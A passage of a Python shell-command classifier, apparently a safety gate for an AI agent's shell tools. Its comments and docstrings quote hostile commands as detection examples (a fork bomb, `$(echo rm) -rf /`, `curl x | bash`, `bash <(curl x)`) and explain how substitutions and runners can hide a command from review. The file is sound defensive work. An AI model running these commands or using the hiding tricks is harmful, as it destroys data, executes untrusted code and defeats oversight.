    if attached is not None:
        first = attached if any(ch.isspace() for ch in attached) else attached + " "
    if any(ch.isspace() for ch in first):
        return " ".join([_reparsed(first)] + ([shlex.join(args[start + 1:])]
                                              if start + 1 < len(args) else []))
    return shlex.join(args[start:])


def _nested_commands(exe: str, args: List[str]) -> Iterable[tuple]:
    """(where, text) for every command this one runs from TEXT it is given: "local" for
    `sh -c`, `su -c` and `eval`, "runner" for the command a project or package runner starts
    (`uv run ...`, `npx ...`, joined back into one text, lazily, so a caller that stops early
    does not pay for the rest), "remote" for `ssh host ...`. A text a shell parses again carries
    its substitutions as bare ones (_reparsed)."""
    if exe in _COMMAND_STRING_SHELLS:
        for pos, tok in enumerate(args):
            if tok in ("-o", "+o"):           # `bash -o pipefail -c ...`: -o takes a word
                continue
            if tok.startswith("-") and not tok.startswith("--") and "c" in tok[1:]:
                return [("local", _reparsed(args[pos + 1]))] if pos + 1 < len(args) else []
        return []
    if exe == "su":
        for pos, tok in enumerate(args):
            if tok in ("-c", "--command") and pos + 1 < len(args):
                return [("local", _reparsed(args[pos + 1]))]
            if tok.startswith("--command="):
                return [("local", _reparsed(tok.split("=", 1)[1]))]
        return []
    if exe == "eval":
        return [("local", _reparsed(" ".join(args)))] if args else []
    if exe == "ssh":
        remote = _ssh_remote_command(args)
        return [("remote", _reparsed(remote))] if remote.strip() else []
    return (("runner", _runner_text(args, start)) for start in _runner_commands(exe, args))


def _is_ftplib(name) -> bool:
    return isinstance(name, str) and name.split(".", 1)[0] == "ftplib"


def _call_argument(node, keyword: str):
    """The constant first argument of a call, positional or as `keyword=`, or None."""
    import ast
    value = node.args[0] if node.args else next(
        (k.value for k in node.keywords if k.arg == keyword), None)
    return value.value if isinstance(value, ast.Constant) else None


def python_code_categories(code: str, *, _depth: int = 0) -> List[str]:
    """["ftp_transfer"] when Python `code` moves files over FTP, else []. Read from the syntax
    tree, so a comment naming ftplib does not count: an import of ftplib (also `from ftplib
    import ...`), a string that IS the module's name, `ftplib` or `ftplib.<name>` (whatever
    imports it: `__import__`, `importlib.import_module` also under an alias, a getattr of
    `__import__`, `-m ftplib` in a subprocess argument list), or a string that starts with
    ftp:// or ftps:// (urllib's FTP, an f-string's literal part). A constant string handed to
    exec, eval or compile is read as code too, a few levels deep. Code that does not parse,
    or nests deeper, is searched as text. Never raises."""
    import ast
    text = code.decode("utf-8", "replace") if isinstance(code, bytes) else str(code or "")
    if _depth > _MAX_CODE_DEPTH:
        return ["ftp_transfer"] if _PYTHON_FTP_TEXT_RE.search(text) else []
    try:
        tree = ast.parse(text)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        return ["ftp_transfer"] if _PYTHON_FTP_TEXT_RE.search(text) else []
    for node in ast.walk(tree):
        if isinstance(node, ast.Import):
            hit = any(_is_ftplib(alias.name) for alias in node.names)
        elif isinstance(node, ast.ImportFrom):
            hit = _is_ftplib(node.module)
        elif isinstance(node, ast.Call):
            fn = node.func
            called = fn.id if isinstance(fn, ast.Name) else (
                fn.attr if isinstance(fn, ast.Attribute) else "")
            if called in _CODE_STRING_CALLS:
                inner = _call_argument(node, "source")
                hit = isinstance(inner, (str, bytes)) and bool(
                    python_code_categories(inner, _depth=_depth + 1))
            else:
                hit = False
        elif isinstance(node, ast.Constant) and isinstance(node.value, str):
            hit = (_is_ftplib(node.value)
                   or node.value.lstrip().lower().startswith(("ftp://", "ftps://")))
        else:
            hit = False
        if hit:
            return ["ftp_transfer"]
    return []


def _runner_commands(exe: str, args: List[str]) -> List[int]:
    """Where in `args` each word list starts that may be the command a project runner starts
    (`uv run CMD ...`, `poetry run`, `conda run -n env`, `uv tool run`) or a package runner
    (`npx CMD`, `npm exec`, `pnpm dlx`, `yarn dlx`, `bunx`, `bun x`, `pipx run`); [] when
    `exe` is no runner. Each such list runs to the end of `args`. The caller classifies each
    one like the text `bash -c` carries, so the wrapper unwrap, the shell descent, the depth
    limit and every category reach the runner's command too.

    A package runner with verbs (_PACKAGE_RUNNERS) starts a command only after one of them:
    before it, an option's following word is skipped as its possible value, a verb opens the
    reading in either position, and any other plain word (or `--`) is the runner's own
    subcommand, so `npm install`, `npm run build` and `pipx install x` start nothing here.

    A runner's words are read up to its command: its verbs (`run`, `exec`, `tool`), its
    options, and the word after an option, which may be that option's value. `--` names the
    command explicitly. The first plain word that is not in a value position is the command,
    and what follows it is that command's data (`uv run printf '%s' python -c ...` prints, it
    starts nothing).

    Named boundary: which options take a value is not known here, so the word after ANY
    option is read both as that option's possible value and as a possible command. A harmless
    command after an option without a value is therefore refused only when what follows it is
    refused in its own right (`conda run -n py --no-capture-output echo python -c 'import
    ftplib'`), and a value that is itself a refused program's name is refused as one (`uv run
    --with ssh pytest`); `uv run -q echo hi` passes. That is the safe side: the other reading
    would let `conda run --cwd /srv python -c ...` pass whenever an option is missing from a
    table, and such a table would be one more copy per runner (uv, poetry, conda, pipenv,
    hatch, pdm) of flags that change with each release. `--` before the command lifts both
    when no word stands in a value position before it; otherwise that word may be the
    command and `--` its first argument (`uv run -q ssh -- host` logs in to `host`), so both
    readings are classified. Writing the value with `=` (`uv run --with=ssh -- pytest`)
    leaves no word in a value position.

    Named boundary: `deno`, `cargo run`, `go run`, `nix run`, `mise exec` and `direnv exec`
    are not read (not measured in VAF's lanes, and a list can miss a runner as the
    downloader list in vaf/tools/bash.py can), nor are `npm run X` and `yarn X`, which start
    a package script, a file, like a shell script is not read. `yarn exec a '&&' b`, where
    yarn's own shell joins the words, is read as the command `a`, not as a shell string."""
    if exe in _PYTHON_RUNNERS:
        verbs = _RUNNER_VERBS
        gate: frozenset = frozenset()
    elif exe in _PACKAGE_RUNNERS:
        verbs, gate = frozenset(), _PACKAGE_RUNNERS[exe]
    else:
        return []
    package = exe in _PACKAGE_RUNNERS
    start = 0
    # npm reads its options anywhere: a `--call`/`-c` before the verb runs its text too
    # (`npm --call='...' exec`, `npm -c '...' exec`, measured with an echo).
    before_verb: List[int] = []
    if gate:
        maybe_value = call_due = False
        for pos, tok in enumerate(args):
            if call_due:
                before_verb.append(pos)     # the value of `--call` / `-c`
                call_due = maybe_value = False
                continue
            if tok in gate:
                start = pos + 1
                break
            if tok in ("--call", "-c"):
                call_due = True
                continue
            if tok.startswith("-") and tok != "--":
                if _attached_call(tok) is not None:
                    before_verb.append(pos)
                    maybe_value = False
                    continue
                maybe_value = "=" not in tok
                continue
            if maybe_value and tok != "--":
                maybe_value = False     # the option's value
                continue
            return []                   # the runner's own subcommand: no command started
        else:
            return []
    found: List[int] = before_verb
    maybe_value = False                 # the word before was an option without `=value`
    for pos in range(start, len(args)):
        tok = args[pos]
        if tok == "--":
            # The rest is the command, whatever it looks like. A value-position word before
            # it stays a candidate: if it was the command, `--` is that command's argument.
            return found + ([pos + 1] if pos + 1 < len(args) else [])
        if tok.startswith("-"):
            if package and _attached_call(tok) is not None:
                found.append(pos)       # `--call=TEXT`: a shell string (_runner_text)
                maybe_value = False
                continue
            maybe_value = "=" not in tok
            continue
        if maybe_value:                 # a possible value, and a possible command
            found.append(pos)
            maybe_value = False
            continue
        if tok in verbs:
            continue
        found.append(pos)               # the command; its words are its data
        return found
    return found


def _exe_base(word: str) -> str:
    """`/usr/bin/python3.exe` -> `python3`, `npx.cmd` and `npx.ps1` -> `npx`: the program name
    a path or a Windows name gives."""
    base = word.rsplit("/", 1)[-1].lower()
    # npm's Windows launchers are `npx.cmd`, `npx.ps1`, `npm.cmd`: the same reasoning.
    return base[:-4] if base.endswith((".exe", ".cmd", ".ps1", ".bat")) else base


def _python_command_categories(args: List[str]) -> List[str]:
    """What `python [options] -c CODE` or `python -m MODULE` does, judged like python_exec's
    code: `-c` as its own word, at the end of a short cluster (`-Ic CODE`) or with the code in
    the same word (`-cCODE`); `-m ftplib` is ftplib's own command-line client. A script file
    is not read (module docstring)."""
    i = 0
    while i < len(args):
        tok = args[i]
        if tok == "--" or tok == "-" or not tok.startswith("-"):
            return []                       # a script file, stdin, or the end of the options
        if tok.startswith("--"):
            i += 2 if tok == "--check-hash-based-pycs" else 1
            continue
        letters = tok[1:]
        step = 1
        for pos, letter in enumerate(letters):
            rest = letters[pos + 1:]
            if letter in ("c", "m"):
                value = rest if rest else (args[i + 1] if i + 1 < len(args) else "")
                if letter == "c":
                    return python_code_categories(value)
                return ["ftp_transfer"] if _is_ftplib(value) else []
            if letter in _PYTHON_VALUE_LETTERS:
                step = 1 if rest else 2
                break
        i += step
    return []


def _is_protected_target(arg: str) -> bool:
    """True when a recursive delete would hit a system or home root.

    A target built by a substitution is judged by its literal part in front of it:
    `/$(...)` and `"$HOME/$(...)"` start at a protected root whatever the substitution prints,
    and a quoted target that IS the substitution (`"$(...)"`, `"$(...)/build"`) is one path
    nobody can read off the text, judged as the root. A bare one in front
    (`$(find . -name __pycache__)`) is a list of words the command prints, as before."""
    for at, ch in enumerate(arg):
        if ch in (_SUBST_BARE, _SUBST_QUOTED):
            if at == 0 and ch == _SUBST_BARE:
                return False
            arg = arg[:at]
            break
    a = arg.strip().strip("'\"").rstrip("/") or "/"
    a_low = a.lower()
    if a in ("/", "/*", "~", "$HOME", "${HOME}") or a_low in ("c:", "c:\\"):
        return True
    for root in _PROTECTED_ROOTS:
        r = root.rstrip("/")
        if not r or r in ("~", "$HOME", "${HOME}"):
            continue
        # /usr and /usr/* are protected, /usr-local-backup is not.
        if a_low == r.lower() or a_low.startswith(r.lower() + "/") and a_low.count("/") <= 2:
            return True
    if a.startswith("~/") and a.count("/") <= 1:
        return True
    return False


def classify_command(command: str, *, profile: str = "host", _depth: int = 0,
                     _budget: Optional[List[int]] = None,
                     _stdin_fetch: bool = False, _arithmetic: bool = False) -> CommandVerdict:
    """Classify a shell command offline. Never raises, never executes anything.

    profile="host"   - unsandboxed lane: refuse the catastrophic set.
    profile="jailed" - bubblewrap/container lane: refuse only what escapes the
                       jail or hurts the machine.
    profile="remote" - runs on another machine: the host set minus the fetch into
                       a shell, which is named instead (module docstring).

    `_budget` (shared by every reading of one top-level call) caps the readings in all
    (MAX_NESTED_COMMANDS) and the text a runner's candidates add up to (the command's own
    length plus _RUNNER_TEXT_SLACK); `_stdin_fetch` says a nested command's input is code fetched
    from the network (`curl x | uv run bash`); `_arithmetic` says the text is a `$((...))` bash
    evaluates, read as a command too: a substitution where a program would stand is its
    operand there (`$(($(nproc)+1))`), every other check holds.
    """
    verdict = CommandVerdict()
    text = (command or "").strip()
    if not text:
        return verdict
    if _budget is None:
        _budget = [MAX_NESTED_COMMANDS, len(text) + _RUNNER_TEXT_SLACK]
    # Every call spends from the budget, a refused one too: a refusal that cost nothing
    # let a runner at the depth limit try each of its value positions, each one joined
    # back into text, which made the work quadratic in the command's length.
    _budget[0] -= 1
    if _depth > MAX_NESTING or _budget[0] < 0:
        verdict.blocked = True
        verdict.categories = ["nested_too_deep"]
        verdict.reason = ("Command contains a forbidden pattern: it "
                          + CATEGORY_REASONS["nested_too_deep"])
        return verdict
    opaque_shape = ""

    triples = _split_segments(text)
    verdict.segments = [seg for _, seg, _ in triples if seg]
    cats: List[str] = []

    if _is_fork_bomb(text):
        cats.append("fork_bomb")

    # What a nested command found. A refusal inside refuses the whole; a remote command's
    # categories are shown but judged by the remote profile, not by this one.
    nested_refusal = ""
    remote_cats: List[str] = []

    pipeline_fetch = _stdin_fetch
    for connector, seg, carried in triples:
        # Only a pipe continues a pipeline. `curl x > f; python parse.py` is a
        # download followed by a separate, human-visible command - the block is
        # reserved for the unreviewable direct pipe into an interpreter. A segment
        # outside a pipe reads this command's own input, fetched code when a fetch
        # pipes into the runner or shell that carries it.
        if connector != "pipe":
            pipeline_fetch = _stdin_fetch
        toks = _tokens(seg)
        exe_at, exe = _executable_at(toks)
        args = toks[exe_at + 1:] if exe_at >= 0 else []
        low = seg.lower()
        # `$(echo rm) -rf /` reads as harmless and executes as `rm -rf /`: the substitution
        # supplies the program, so no reader - human or classifier - can tell from the text
        # what runs. Judged at the program word itself, so a wrapper, a `VAR=` prefix or a
        # runner in front (`env $(echo rm) -rf /`) changes nothing, while one in an argument
        # or a wrapper option's value (`sudo -u $(whoami) ls`) is ordinary.
        if exe_at >= 0 and "opaque_command" not in cats and not _arithmetic:
            word = toks[exe_at]
            if (_SUBST_BARE in word or _SUBST_PROC in word
                    or _SUBST_QUOTED in word.rsplit("/", 1)[-1]):
                cats.append("opaque_command")
                opaque_shape = opaque_shape or (
                    "env_values" if any(_exe_base(t) == "env" for t in toks[:exe_at])
                    else "program")
        # A shell or interpreter that runs another command's OUTPUT as its script: through a
        # process substitution, a here-string or a heredoc holding a substitution, or a
        # descriptor fed by one (`source <(pyenv init -)`, `bash <<< "$(...)"`,
        # `. /dev/fd/3 3< <(...)`): the same as `eval "$(...)"`, the approved text does not
        # show what runs. Literal text fed to a shell is read as shell text, like `bash -c`.
        # A file is read as before.
        script_literals: List[str] = []
        if exe in _SHELL_SINKS:
            from_output, script_literals = _script_input(exe, args, carried)
            if from_output:
                if "opaque_command" not in cats:
                    cats.append("opaque_command")
                opaque_shape = "shell_text"

        # A local nested command's output is this segment's output: fetched or remote
        # content when it fetches (`uv run curl x | bash`). Applied after this segment's own
        # sink check, so `bash -c 'curl x'` alone is no pipe into a shell.
        nested_fetch = False
        # A process substitution that fetches hands this segment fetched code as a file
        # (`bash <(curl x)`), applied before the sink check below.
        input_fetch = False
        # What this segment carries, read first: its substitutions, each a local command of
        # its own that spends from the budget (`$( )` and a subshell read this segment's
        # input: `curl x | echo $(bash)`), then the commands it runs from text.
        # Once the budget is spent a refusal is recorded (the call that overdrew it was
        # refused, and its refusal reached this loop), so a later segment's nested commands
        # are not read at all: `uv run echo ok; uv run echo ok; ...` would otherwise join
        # and classify one candidate per segment, past the bound the budget sets per call.
        def _carried():
            for kind, inner in carried:
                if kind in ("heredoc", "heredoc_x"):
                    continue                # data; its substitutions are carried apart
                if kind == "unreadable":
                    yield kind, "", inner
                    continue
                # Every `$((` is read as a command as well as arithmetic, charged like a
                # runner's candidates. One bash evaluates (_split_segments) is read once, as a
                # command whose substitutions may stand where a program would; any other is
                # read as arithmetic (its own substitutions, as the arguments of the no-op `:`)
                # and as the command substitution bash may run instead.
                if kind == "arithmetic":
                    yield "arithmetic", "charged", inner[1:-1]
                elif kind == "arithmetic*":
                    body = inner[1:]
                    yield "arithmetic*", "charged", ": " + (body[:-1] if body.endswith(")")
                                                            else body)
                    yield "command", "charged", inner
                else:
                    yield kind, "local", inner
            for literal in script_literals:
                yield "", "local", literal
            for where, inner in _nested_commands(exe, args) if exe_at >= 0 else ():
                yield "", where, inner

        # `>( )` receives what this segment writes: its fetched input passed on, or what it
        # fetches itself (`curl x | tee >(bash)`, `curl x > >(bash)`).
        writes_fetched = pipeline_fetch or exe in _NETWORK_FETCHERS or exe == "ssh"
        nested = _carried() if _budget[0] >= 0 else ()
        for kind, where, inner in nested:
            if not inner.strip():
                continue                    # `f()`, `$( )`: nothing to read, no reading spent
            if kind == "unreadable":
                if "opaque_command" not in cats:
                    cats.append("opaque_command")
                opaque_shape = opaque_shape or "unreadable"
                continue
            if where in ("runner", "charged"):
                # Each runner candidate is the rest of the command again: charged, so their
                # sum stays within the command's own length plus a fixed slack.
                _budget[1] -= len(inner)
                if _budget[1] < 0:
                    _budget[0] = -1
                    if "nested_too_deep" not in cats:
                        cats.append("nested_too_deep")
                    break
            local = where != "remote"
            if kind == "process_out":
                stdin_fetch = writes_fetched
            else:
                stdin_fetch = pipeline_fetch and local and kind in (
                    "", "command", "subshell", "arithmetic", "arithmetic*")
            sub = classify_command(inner, profile=profile if local else "remote",
                                   _depth=_depth + 1, _budget=_budget,
                                   _stdin_fetch=stdin_fetch,
                                   _arithmetic=kind == "arithmetic")
            if kind:
                verdict.segments.extend(sub.segments)
            target = cats if local else remote_cats
            target.extend(c for c in sub.categories if c not in target)
            if "opaque_command" in sub.categories and not opaque_shape:
                # `eval "$(...)"`, `bash -c "$(...) ..."`: the text it runs is printed by a
                # substitution. Otherwise the inner reading's own shape.
                opaque_shape = ("shell_text" if where in ("local", "remote") and not kind
                                and _SUBST_BARE in inner else sub.opaque_shape)
                if where == "runner" and opaque_shape == "program" and _value_from_substitution(
                        args):
                    opaque_shape = "option_value"   # `uv run --with $(cat r) pytest`
            fetched = "network_fetch" in sub.categories or "remote_login" in sub.categories
            if local and fetched:
                nested_fetch = True
                # `bash <(curl x)` reads it as a file; `bash <<< "$(curl x)"` as its input.
                if kind == "process_in" or (kind == "command" and "<<<" in seg):
                    input_fetch = True
            if sub.blocked and not nested_refusal:
                nested_refusal = sub.reason
            # The budget is spent and this refusal is recorded: the remaining candidates
            # would each be refused the same way, after being joined back into text.
            if _budget[0] < 0:
                break
        if input_fetch:
            pipeline_fetch = True
        if not toks:                    # `(bash)`: only what it carries
            if nested_fetch:
                pipeline_fetch = True
            continue

        if exe in _REMOTE_LOGINS and "remote_login" not in cats:
            cats.append("remote_login")
        if (exe in _FTP_CLIENTS or (exe in _NETWORK_FETCHERS
                                    and any(_FTP_URL_RE.match(a) for a in args))
                or (_PYTHON_EXE_RE.match(exe) and _python_command_categories(args))) \
                and "ftp_transfer" not in cats:
            cats.append("ftp_transfer")

        if exe in _NETWORK_FETCHERS:
            pipeline_fetch = True
            if "network_fetch" not in cats:
                cats.append("network_fetch")
        elif exe == "ssh":
            # What `ssh host cmd` prints is the other machine's output: piped into a
            # local shell it is code from elsewhere, like a download.
            pipeline_fetch = True
        if exe in _SHELL_SINKS and pipeline_fetch and "pipe_to_shell" not in cats:
            cats.append("pipe_to_shell")
        if nested_fetch:
            pipeline_fetch = True

        is_device_writer = exe in _DEVICE_WRITERS or exe.startswith("mkfs")
        if is_device_writer or _DEVICE_TARGET_RE.search(low) or _REDIRECT_DEVICE_RE.search(low):
            if exe == "dd" and not _DEVICE_TARGET_RE.search(low):
                pass  # dd on a regular file is ordinary
            elif "device_write" not in cats:
                cats.append("device_write")

        if exe == "rm":
            recursive = any(t.startswith("-") and not t.startswith("--") and "r" in t.lower()
                            for t in args) or "--recursive" in args
            targets = [t for t in args if not t.startswith("-")]
            if recursive and any(_is_protected_target(t) for t in targets):
                if "destructive_removal" not in cats:
                    cats.append("destructive_removal")

        if any(p.lower() in low for p in _CREDENTIAL_PATHS) and "credential_read" not in cats:
            cats.append("credential_read")

        if exe == "git" and ("reset --hard" in low or "clean -fd" in low or "push --force" in low):
            if "history_rewrite" not in cats:
                cats.append("history_rewrite")

    blocking = [c for c in cats if c in _BLOCKING.get(profile, _BLOCKING["host"])]
    verdict.categories = cats + [c for c in remote_cats if c not in cats]
    if "opaque_command" in cats:
        verdict.opaque_shape = opaque_shape or "program"
    if blocking:
        verdict.blocked = True
        first = blocking[0]
        text = CATEGORY_REASONS[first]
        if first == "opaque_command":
            text = _OPAQUE_REASONS.get(verdict.opaque_shape, text)
        text += _WAY_OUT.get(first, "")
        verdict.reason = f"Command contains a forbidden pattern: it {text}"
    elif nested_refusal:
        verdict.blocked = True
        verdict.reason = nested_refusal
    return verdict


def _is_fork_bomb(text: str) -> bool:
    """`:(){ :|:& };:`, with any whitespace between its parts: `:(){`, then `|:&`, then `};:`.
    Three searches, one after the other, so the work is linear in the text. A regular
    expression with two unbounded `.*` grew with the cube of the length on text built to
    provoke it (measured: 8 KB 1.6 s, 16 KB 11 s, on the gate path before anyone is asked)."""
    flat = _WHITESPACE_RE.sub("", text)
    start = flat.find(":(){")
    if start < 0:
        return False
    pipe = flat.find("|:&", start + 4)
    return pipe >= 0 and flat.find("};:", pipe + 3) >= 0


def _value_from_substitution(args: List[str]) -> bool:
    """Whether a runner's option takes its value from a substitution as the next word."""
    for pos, tok in enumerate(args[1:], start=1):
        prev = args[pos - 1]
        if (_SUBST_BARE in tok or _SUBST_QUOTED in tok) and prev.startswith("-") \
                and "=" not in prev:
            return True
    return False


# Shells that read their script from their input when given none, and the two builtins that
# run a file in the current shell.
_STDIN_SHELLS = frozenset({"sh", "bash", "zsh", "dash", "ksh", "source", "."})
# A script path that is this process's input or one of its descriptors.
_DESCRIPTOR_RE = re.compile(r"^(?:-|/dev/stdin|/dev/fd/\d+|/proc/self/fd/\d+)$")
# A redirection operator standing as a word of its own (`<`, `3<`, `2>`, `>>`, `&>`).
_REDIRECT_RE = re.compile(r"^\d*(?:<|>|>>|<>|>&|<&|&>|&>>)$")


def _script_input(exe: str, args: List[str], carried: List[tuple]) -> tuple:
    """(runs another command's output, literal script texts) for a shell or an interpreter.

    Its script is its first word that is no option and no redirection. It comes from its
    input when there is none, when it is `-` or a descriptor path (`/dev/stdin`,
    `/dev/fd/N`, `/proc/self/fd/N`), or with `-s`. Fed by a process substitution (as the
    script itself or through `<`, `3<`), by a here-string or a heredoc holding a
    substitution, it runs another command's output. Fed by a literal here-string or heredoc
    body, a shell runs that text, returned to be read like `bash -c` text."""
    shell = exe in _STDIN_SHELLS
    inline = "c" if shell else "cemr"          # -c CODE, -e/-r CODE, -m MODULE
    script = None
    from_stdin = False
    proc_fed = False
    here_words: List[str] = []
    pos = 0
    while pos < len(args):
        tok = args[pos]
        nxt = args[pos + 1] if pos + 1 < len(args) else ""
        if tok == "<<<":
            here_words.append(nxt)
            pos += 2
            continue
        if _REDIRECT_RE.match(tok):
            proc_fed = proc_fed or (tok.endswith("<") and nxt == _SUBST_PROC)
            pos += 2
            continue
        if tok[:1] in "<>" or (tok[:1].isdigit() and tok.lstrip("0123456789")[:1] in ("<", ">")):
            pos += 1                       # `2>/dev/null`, `<file`: an attached redirection
            continue
        if script is None and tok.startswith(("-", "+")) and tok not in ("-", "--"):
            letters = tok[1:] if not tok.startswith("--") else ""
            if any(c in inline for c in letters):
                return False, []            # code given inline: read elsewhere (`bash -c`)
            from_stdin = from_stdin or (shell and "s" in letters)
            pos += 2 if tok in ("-o", "+o") else 1
            continue
        if script is None:
            script = tok
        pos += 1
    if script == _SUBST_PROC:
        return True, []
    if exe in ("source", "."):
        from_input = script is not None and bool(_DESCRIPTOR_RE.match(script))
    else:
        from_input = script is None or from_stdin or bool(_DESCRIPTOR_RE.match(script))
    if not from_input:
        return False, []
    kinds = [kind for kind, _ in carried]
    if (proc_fed or "heredoc_x" in kinds
            or any(_SUBST_BARE in w or _SUBST_QUOTED in w for w in here_words)):
        return True, []
    if not shell:
        return False, []
    return False, here_words + [body for kind, body in carried if kind == "heredoc"]


def is_command_safe(command: str, *, profile: str = "host") -> tuple:
    """(is_safe, message) adapter kept for the two shell tools.

    The message is the refusal reason when blocked, else a note for the
    noteworthy-but-allowed categories.
    """
    v = classify_command(command, profile=profile)
    return (not v.blocked), (v.reason if v.blocked else v.warning)
